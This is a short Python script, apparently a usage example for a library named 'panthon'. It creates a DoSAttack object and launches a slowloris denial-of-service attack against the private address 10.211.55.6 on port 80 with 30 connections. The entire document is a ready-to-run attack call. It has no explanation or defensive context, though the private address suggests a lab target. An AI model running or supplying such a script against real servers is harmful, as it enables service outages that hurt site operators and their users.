from panthon import DoSAttack

dos = DoSAttack()
dos.slowloris_attack(target="10.211.55.6", target_port=80, num_connections=30)
